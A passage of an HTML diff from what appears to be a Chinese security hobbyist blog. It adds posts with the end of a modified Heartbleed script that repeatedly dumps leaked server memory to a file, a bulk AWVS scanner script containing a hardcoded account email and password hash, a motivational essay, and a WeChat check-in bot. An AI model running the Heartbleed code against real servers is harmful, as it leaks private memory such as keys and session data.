class="string">&#x27;No heartbeat response received, server likely not vulnerable&#x27;</span></span><br><span class="line">			<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> typ == <span class="number">24</span>:</span><br><span class="line">			<span class="built_in">print</span> <span class="string">&#x27;Received heartbeat response:&#x27;</span></span><br><span class="line">			<span class="keyword">while</span> <span class="literal">True</span>:<span class="comment">#循环hexdump后延迟</span></span><br><span class="line">				<span class="keyword">try</span>:</span><br><span class="line">					hexdump(pay)</span><br><span class="line">					file_judge()</span><br><span class="line">					delay(opts.time)</span><br><span class="line">				<span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">					<span class="built_in">print</span> <span class="string">&#x27;Exit！&#x27;</span></span><br><span class="line">					exit()</span><br><span class="line">				<span class="keyword">except</span>:<span class="comment">#如果发生错误，强制等待5分钟后重试</span></span><br><span class="line">					<span class="built_in">print</span> <span class="string">&#x27;Error Forced Delay of 5 Minutes&#x27;</span></span><br><span class="line">					delay(<span class="number">300</span>)</span><br><span class="line">			<span class="keyword">if</span> <span class="built_in">len</span>(pay) &gt; <span class="number">3</span>:</span><br><span class="line">				<span class="built_in">print</span> <span class="string">&#x27;WARNING: server returned more data than it should - server is vulnerable!&#x27;</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				<span class="built_in">print</span> <span class="string">&#x27;Server processed malformed heartbeat, but did not return any extra data.&#x27;</span></span><br><span class="line">			<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> typ == <span class="number">21</span>:</span><br><span class="line">			<span class="built_in">print</span> <span class="string">&#x27;Received alert:&#x27;</span></span><br><span class="line">			hexdump(pay)</span><br><span class="line">			<span class="built_in">print</span> <span class="string">&#x27;Server returned error, likely not vulnerable&#x27;</span></span><br><span class="line">			<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">			</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">	opts, args = options.parse_args()</span><br><span class="line">	<span class="keyword">global</span> tmp_file</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(args) &lt; <span class="number">1</span>:</span><br><span class="line">		options.print_help()</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	tmp_file = opts.dest</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(version)):</span><br><span class="line">		<span class="built_in">print</span> <span class="string">&#x27;Trying &#x27;</span> + version[i][<span class="number">0</span>] + <span class="string">&#x27;...&#x27;</span></span><br><span class="line">		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">		<span class="built_in">print</span> <span class="string">&#x27;Connecting...&#x27;</span></span><br><span class="line">		sys.stdout.flush()</span><br><span class="line">		s.connect((args[<span class="number">0</span>], opts.port))</span><br><span class="line">		<span class="built_in">print</span> <span class="string">&#x27;Sending Client Hello...&#x27;</span></span><br><span class="line">		sys.stdout.flush()</span><br><span class="line">		s.send(create_hello(version[i][<span class="number">3</span>]))</span><br><span class="line">		<span class="built_in">print</span> <span class="string">&#x27;Waiting for Server Hello...&#x27;</span></span><br><span class="line">		sys.stdout.flush()</span><br><span class="line">		<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">			typ, ver, pay = recvmsg(s)</span><br><span class="line">			<span class="keyword">if</span> typ == <span class="literal">None</span>:</span><br><span class="line">				<span class="built_in">print</span> <span class="string">&#x27;Server closed connection without sending Server Hello.&#x27;</span></span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			<span class="comment"># Look for server hello done message.</span></span><br><span class="line">			<span class="keyword">if</span> typ == <span class="number">22</span> <span class="keyword">and</span> <span class="built_in">ord</span>(pay[<span class="number">0</span>]) == <span class="number">0x0E</span>:</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">		<span class="built_in">print</span> <span class="string">&#x27;Sending heartbeat request...&#x27;</span></span><br><span class="line">		sys.stdout.flush()</span><br><span class="line">		s.send(create_hb(version[i][<span class="number">4</span>]))</span><br><span class="line">		<span class="keyword">if</span> hit_hb(s,create_hb(version[i][<span class="number">5</span>])):</span><br><span class="line">			<span class="comment">#Stop if vulnerable</span></span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
+
+
+ 
+      <!-- reward -->
+      
+    </div>
+    
 
     <!-- copyright -->
     
@@ -220,7 +329,7 @@
 
     
  
-   
+    
 </article>
 
     
@@ -243,6 +352,7 @@
 </h2>
  
 
+      
     </header>
      
     <div class="article-meta">
@@ -250,7 +360,16 @@
   <time datetime="2019-01-23T16:00:00.000Z" itemprop="datePublished">2019-01-24</time>
 </a>    
     </div>
+      
+    <div class="article-entry" itemprop="articleBody">
        
+  <p>有一群人，他们积极自律，每天按计划行事，有条不紊；他们不张扬，把自己当成最卑微的小草，等待着人生开出花朵的那天。他们早晨5点多起来健身，你在睡觉；7点开始享受丰盛的早餐，蛋白质维生素淀粉粗纤维样样俱全，为新的一天起了一个好头，当他们收拾妥当准备开始一整天的工作时，你还在睡觉；</p>
+<p>他们用上午的高效时间完成了一个又一个任务，甚至发现的新的商机，发现了有可能给人生带来改观的机遇，当午餐时间临近，他们伸了伸腰，准备稍作休息，此时你终于起床。<br>他们的午餐不铺张浪费，却营养全面，他们有选择的进食，因为清楚的知道自己想要的是什么，而你也在起床之后但觉到了饿意，你早早的洗了把脸，甚至连牙都没刷，打开冰箱，拿出了昨晚跟朋友high过之后带回来的薯条以及可乐；<br>午睡之后，他们重新积极的投入工作，而你也终于吃饱喝足，坐在了电脑前。是的，你的一天开始了。<br>晚上回到家里，他们也打开了电脑，也许是为了完成白天没来得及做完的工作，也许是因为前两天刚报了一个网络课堂，此时你还沉浸在dota中，你发的贴子还不够有人气，你发现空老师又更新微薄了，电视剧里男女猪脚还没有最后在一起，作恶多端的女二号还没有得到应有的报应。<br>终于，22点到了，他们停下了工作，或许去满满的书架上拿下了一本书，或许拿起了自己心爱的乐器打算练练手，或许已经上床睡觉。当然，睡之前他们会想一想，自己在这一天都做了什么，有什么收获，又有什么教训。<br>最后，他们又重新提醒了一下自己那个埋在内心深处的梦想，然后满意的睡去了。此时的你还在等待升级，还在顶贴子，还在刷微薄，还在为了男一号女一号哭哭啼啼，你的一天才刚刚开始精彩。<br>后半夜，你隐约感到了困意，依依不舍的关掉了电脑，身上已经很臭，你却懒得去洗一个澡。你走向了乱糟糟的床，钻进了肮脏的被窝，掏出了手机——是的，爪机党伤不起。<br>你隐约知道自己的身边有那么一群“他们”，可是你却没有办法实实在在的感受到他们的存在。直到有一天，你和“他/她”终于浪漫的相见了——<br>他/她是老总，你是普通的打工仔；<br>他/她是主任，你是弱爆了的小职员；<br>他/她游历各国，念着你想念的大学，拍着你想拍的照片，过着你想过的生活，他/她各种恣意的小清新，<br>而你，是的，我知道你恨小清新，可是这又有什么关系？事实已经如此，你就是那个电脑荧光照射下的SB。</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
 
     <!-- copyright -->
     
@@ -263,7 +382,7 @@
 
     
  
-   
+    
 </article>
 
     
@@ -284,6 +403,7 @@
 </h2>
  
 
+      
     </header>
      
     <div class="article-meta">
@@ -291,7 +411,23 @@
   <time datetime="2019-01-17T16:00:00.000Z" itemprop="datePublished">2019-01-18</time>
 </a>    
     </div>
+      
+    <div class="article-entry" itemprop="articleBody">
        
+  <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>声明：该脚本的作者是jamesj老哥于 2017-5-24 12:03在吾爱上发布的，我拿到脚本后用了一段时间，觉得有些问题，趁着学习python的这段时间，修改下源码练练手。</p>
+<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>有的时候当拿到单位给的大量网站进行漏扫（已授权）但又没买专业扫描器时，人工检测效率太低，就只能靠着网上的免（po）费（jie）扫描器混吃等死。。。</p>
+<p>改动如下：</p>
+<p>1.多线程添加扫描任务<br>2.删除原程序不常用的功能（删除所有扫描任务、查看已存在任务）<br>3.多线程删除已添加任务（由于awvs每次只返回100个任务，原代码每次只能删出一百条，需要重复输入）</p>
+<p>附上代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">thread_max = <span class="number">20</span>  <span class="comment"># 程序线程</span></span><br><span class="line">threads = []</span><br><span class="line">del_int = <span class="number">10</span> <span class="comment">#循环删除次数</span></span><br><span class="line">URL_FILE = <span class="string">&#x27;url.txt&#x27;</span><span class="comment">#要扫描的url列表（不加http://）</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">----------改动---------</span></span><br><span class="line"><span class="string">1.多线程添加扫描任务</span></span><br><span class="line"><span class="string">2.删除原程序不常用的功能（删除所有扫描任务、查看已存在任务）</span></span><br><span class="line"><span class="string">3.多线程删除已添加任务（由于awvs每次只返回100个任务，原代码每次只能删出一百条，需要重复输入）</span></span><br><span class="line"><span class="string">----------改动---------</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#The second revision comes from GuoKer </span></span><br><span class="line">__author = <span class="string">&quot;jamesj&quot;</span></span><br><span class="line"><span class="comment"># localhost:3443全部替换为awvs所在的服务器及端口</span></span><br><span class="line">username = <span class="string">&#x27;guokers@gov.cn&#x27;</span></span><br><span class="line"><span class="comment"># 账号邮箱</span></span><br><span class="line">pw = <span class="string">&#x27;a50ce9f2d32efac35d30e962bd6e08899e3f0aece837b0198ac55b86fd85e199&#x27;</span></span><br><span class="line"><span class="comment"># sha256加密后的密码。</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	_create_unverified_https_context = ssl._create_unverified_context</span><br><span class="line"><span class="keyword">except</span> AttributeError:</span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	ssl._create_default_https_context = _create_unverified_https_context</span><br><span class="line"></span><br><span class="line">url_login = <span class="string">&quot;https://localhost:3443/api/v1/me/login&quot;</span></span><br><span class="line">send_headers_login = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;localhost:3443&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/json, text/plain, */*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, br&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json;charset=utf-8&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data_login = <span class="string">&#x27;&#123;&quot;email&quot;:&quot;&#x27;</span> + username + <span class="string">&#x27;&quot;,&quot;password&quot;:&quot;&#x27;</span> + pw + <span class="string">&#x27;&quot;,&quot;remember_me&quot;:false&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">req_login = urllib2.Request(url_login, headers=send_headers_login)</span><br><span class="line">response_login = urllib2.urlopen(req_login, data_login)</span><br><span class="line">xauth = response_login.headers[<span class="string">&#x27;X-Auth&#x27;</span>]</span><br><span class="line">COOOOOOOOkie = response_login.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>]</span><br><span class="line"><span class="comment">#print&quot;当前验证信息如下\r\n cookie : %r  \r\n X-Auth : %r  &quot; % (COOOOOOOOkie, xauth)</span></span><br><span class="line">send_headers2 = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;localhost:3443&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/json, text/plain, */*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json;charset=utf-8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X-Auth&#x27;</span>: xauth,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: COOOOOOOOkie</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 以上代码实现登录（获取cookie）和校验值</span></span><br><span class="line"><span class="comment">#-------------------------------------------------------------------------</span></span><br><span class="line">url = <span class="string">&quot;https://localhost:3443/api/v1/targets&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_exec_scan</span>(<span class="params">url_txt</span>):</span></span><br><span class="line">    target_url = <span class="string">&#x27;http://&#x27;</span> + url_txt</span><br><span class="line">    data = <span class="string">&#x27;&#123;&quot;description&quot;:&quot;222&quot;,&quot;address&quot;:&quot;&#x27;</span> + target_url + <span class="string">&#x27;&quot;,&quot;criticality&quot;:&quot;10&quot;&#125;&#x27;</span></span><br><span class="line">    <span class="comment"># data = urllib.urlencode(data)由于使用json格式所以不用添加</span></span><br><span class="line">    req = urllib2.Request(url, headers=send_headers2)</span><br><span class="line">    response = urllib2.urlopen(req, data)</span><br><span class="line">    jo = json.loads(response.read())</span><br><span class="line">    target_id = jo[<span class="string">&#x27;target_id&#x27;</span>]  <span class="comment"># 获取添加后的任务ID</span></span><br><span class="line">    <span class="comment"># 以上代码实现批量添加</span></span><br><span class="line"></span><br><span class="line">    url_scan = <span class="string">&quot;https://localhost:3443/api/v1/scans&quot;</span></span><br><span class="line">    headers_scan = &#123;</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;localhost:3443&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/json, text/plain, */*&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, br&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json;charset=utf-8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;X-Auth&#x27;</span>: xauth,</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: COOOOOOOOkie,</span><br><span class="line">    &#125;</span><br><span class="line">    data_scan = <span class="string">&#x27;&#123;&quot;target_id&quot;:&#x27;</span> + <span class="string">&#x27;\&quot;&#x27;</span> + target_id + <span class="string">&#x27;\&quot;&#x27;</span> + <span class="string">&#x27;,&quot;profile_id&quot;:&quot;11111111-1111-1111-1111-111111111111&quot;,&quot;schedule&quot;:&#123;&quot;disable&quot;:false,&quot;start_date&quot;:null,&quot;time_sensitive&quot;:false&#125;,&quot;ui_session_id&quot;:&quot;66666666666666666666666666666666&quot;&#125;&#x27;</span></span><br><span class="line">    req_scan = urllib2.Request(url_scan, headers=headers_scan)</span><br><span class="line">    response_scan = urllib2.urlopen(req_scan,<span class="built_in">str</span>(data_scan))</span><br><span class="line">    <span class="built_in">print</span> target_url + <span class="string">&quot;添加成功！&quot;</span></span><br><span class="line">    threads.pop(<span class="number">0</span>)<span class="comment">#线程序结束标志</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count</span>():</span></span><br><span class="line">    url_count = <span class="string">&quot;https://localhost:3443/api/v1/notifications/count&quot;</span></span><br><span class="line">    req_count = urllib2.Request(url_count, headers=send_headers2)</span><br><span class="line">    response_count = urllib2.urlopen(req_count)</span><br><span class="line">    <span class="built_in">print</span><span class="string">&quot;当前存在%r个通知！&quot;</span> % json.loads(response_count.read())[<span class="string">&#x27;count&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span><span class="string">&quot;-&quot;</span> * <span class="number">20</span></span><br><span class="line">    <span class="comment"># print&quot;已存在以下任务&quot;</span></span><br><span class="line">    url_info = <span class="string">&quot;https://localhost:3443/api/v1/scans&quot;</span></span><br><span class="line">    req_info = urllib2.Request(url_info, headers=send_headers2)</span><br><span class="line">    response_info = urllib2.urlopen(req_info)</span><br><span class="line">    all_info = json.loads(response_info.read())</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> website <span class="keyword">in</span> all_info.get(<span class="string">&quot;scans&quot;</span>):</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">        <span class="comment"># print </span></span><br><span class="line">        <span class="comment"># website.get(&quot;target&quot;).get(&quot;address&quot;) + &quot;\n target_id:&quot; + website.get(&quot;scan_id&quot;)</span></span><br><span class="line">    <span class="built_in">print</span><span class="string">&quot;共 %r个扫描任务(最多显示100个))&quot;</span> % num</span><br><span class="line"><span class="comment"># count()</span></span><br><span class="line"><span class="comment"># scan、target、notification！</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_targets</span>():</span></span><br><span class="line">    url_info = <span class="string">&quot;https://localhost:3443/api/v1/targets&quot;</span></span><br><span class="line">    req_info = urllib2.Request(url_info, headers=send_headers2)</span><br><span class="line">    response_info = urllib2.urlopen(req_info)</span><br><span class="line">    all_info = json.loads(response_info.read())</span><br><span class="line">    <span class="keyword">for</span> website <span class="keyword">in</span> all_info[<span class="string">&quot;targets&quot;</span>]:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> thread_max &gt; <span class="built_in">len</span>(threads):</span><br><span class="line">                threads.append(threading.Thread(target=del_tmp,args=(website,)).start())<span class="comment">#启动子线程</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># del_targets()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_tmp</span>(<span class="params">website</span>):</span> <span class="comment">#删除任务</span></span><br><span class="line">    <span class="keyword">if</span> (website.get(<span class="string">&quot;description&quot;</span>)) == <span class="string">&quot;222&quot;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url_scan_del = <span class="string">&quot;https://localhost:3443/api/v1/targets/&quot;</span> + <span class="built_in">str</span>(website[<span class="string">&quot;target_id&quot;</span>])</span><br><span class="line">            req_del = urllib2.Request(url_scan_del, headers=send_headers2)</span><br><span class="line">            req_del.get_method = <span class="keyword">lambda</span>: <span class="string">&#x27;DELETE&#x27;</span></span><br><span class="line">            response_del = urllib2.urlopen(req_del)</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;ok!&quot;</span></span><br><span class="line">            threads.pop(<span class="number">0</span>)<span class="comment">#线程序结束标志</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;-&quot;</span> * <span class="number">20</span></span><br><span class="line">    count()</span><br><span class="line">    <span class="built_in">print</span><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    1、添加扫描任务并执行请输入1</span></span><br><span class="line"><span class="string">    2、删除所有使用该脚本添加的任务请输入2</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    choice = raw_input(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    <span class="comment">#	print type(choice)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> choice == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        <span class="keyword">for</span> url_txt <span class="keyword">in</span> <span class="built_in">open</span>(URL_FILE,<span class="string">&#x27;r&#x27;</span>).read().split():</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">if</span> thread_max &gt; <span class="built_in">len</span>(threads):</span><br><span class="line">                    threads.append(threading.Thread(target=add_exec_scan,args=(url_txt,)).start())<span class="comment">#启动线程</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        count()</span><br><span class="line">        all_time = time.time() - start_time</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;共用时&#x27;</span>,all_time</span><br><span class="line">    <span class="keyword">elif</span> choice == <span class="string">&quot;2&quot;</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(del_int):</span><br><span class="line">            del_targets()</span><br><span class="line">        count()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span></span><br><span class="line">        <span class="string">&quot;请重新运行并请输入1、2选择。&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://i.loli.net/2019/01/18/5c418137363e0.jpg" alt="- - " title="- -"></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
 
     <!-- copyright -->
     
@@ -304,7 +440,7 @@
 
     
  
-   
+    
 </article>
 
     
@@ -325,6 +461,7 @@
 </h2>
  
 
+      
     </header>
      
     <div class="article-meta">
@@ -332,7 +469,17 @@
   <time datetime="2019-01-11T16:00:00.000Z" itemprop="datePublished">2019-01-12</time>
 </a>    
     </div>
+      
+    <div class="article-entry" itemprop="articleBody">
        
+  <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本来说是昨天写这两篇的（签到和天气发送），但是看到小伙伴给的一个exp后想做下批量，就跑去研究fofa与zoomeye的api了，所以耽误了。。。<br>总的来说实现定时签到很简单，几行代码就可以搞定，本文就拿T00ls的工作号来做示范。<br>程序的大致流程：1.登录微信-》2.搜索公众号-》3.发送签到-》4.延迟&gt;-》5.循环（返回3）</p>
+<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> itchat</span><br><span class="line"></span><br><span class="line">itchat.auto_login(<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#查询T00ls</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_mps</span>():</span></span><br><span class="line">    mps = itchat.get_mps()</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> mps:</span><br><span class="line">        <span class="keyword">if</span> a[<span class="string">&#x27;NickName&#x27;</span>] == <span class="string">&#x27;T00ls&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> a[<span class="string">&#x27;UserName&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#检测时间，并签到</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            itchat.send(<span class="string">&#x27;3&#x27;</span>,toUserName=find_mps())</span><br><span class="line">            time.sleep(<span class="number">10</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;消息已发送，当前时间为：&#x27;</span>+time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>))</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;！！！您已手动退出！！！&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在实际使用中我发现，由于不清楚网页微信在线状态的存活时间，不知道要在哪儿加判断，来判断微信已掉线了，所以我还是得需要再深入学习itchat，解决这个问题，写着玩玩还行，稳定性不敢保证<br>PS：t00ls上也有同学写了签到，他说理论上可以一直签不会掉（人家附上了一个多星期的签到截图）</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
 
     <!-- copyright -->
     
@@ -345,7 +492,7 @@
 
     
  
-   
+    
 </article>
 
     
@@ -366,18 +513,12 @@
     <ul>
       <li>
         Copyrights &copy;
-        2017-2021
+        2017-2022
         <i class="ri-heart-fill heart_icon"></i> GuoKer
       </li>
     </ul>
     <ul>
       <li>
-        
-        
-        
-        由 <a href="https://hexo.io" target="_blank">Hexo</a> 强力驱动
-        <span class="division">|</span>
-        主题 - <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
         
       </li>
     </ul>
@@ -389,9 +530,12 @@
     <ul>
       
         <li>
-          <a href="http://beian.miit.gov.cn/" target="_black">桂ICP备19000641号-1</a>
+          <a href="http://beian.miit.gov.cn/" target="_black" rel="nofollow">桂ICP备19000641号-1</a>
         </li>
         
+    </ul>
+    <ul>
+      
     </ul>
     <ul>
       <li>
@@ -402,9 +546,10 @@
       </li>
     </ul>
   </div>
-</footer>
-      <div class="float_btns">
-        <div class="totop" id="totop">
